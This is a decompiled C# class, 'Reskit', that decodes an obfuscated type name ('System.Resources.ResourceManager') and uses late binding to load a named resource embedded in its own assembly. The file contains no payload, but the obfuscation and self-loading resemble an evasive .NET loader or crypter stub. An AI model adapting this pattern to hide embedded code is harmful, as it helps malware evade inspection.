using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

public class Reskit
{
	[DebuggerNonUserCode]
	public Reskit()
	{
	}

	public static object GetObject(string ResourceNamespace, string ResourceName)
	{
		string text = Tools.DcStr("Ntno`h)M`njpm^`n)M`njpm^`H\\i\\b`m");
		object assembly = Assembly.GetAssembly(Type.GetType(text));
		object[] array = new object[7]
		{
			text,
			false,
			BindingFlags.Default,
			null,
			new object[3]
			{
				ResourceNamespace,
				Tools.Myself,
				null
			},
			null,
			null
		};
		object[] array2 = array;
		bool[] array3 = new bool[7] { true, false, false, false, false, false, false };
		object obj = NewLateBinding.LateGet(assembly, (Type)null, "CreateInstance", array2, (string[])null, (Type[])null, array3);
		if (array3[0])
		{
			text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
		}
		object objectValue = RuntimeHelpers.GetObjectValue(obj);
		object[] array4 = new object[1] { ResourceName };
		object[] array5 = array4;
		array3 = new bool[1] { true };
		object result = NewLateBinding.LateGet(objectValue, (Type)null, "getobject", array5, (string[])null, (Type[])null, array3);
		if (array3[0])
		{
			ResourceName = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			return result;
		}
		return result;
	}
}
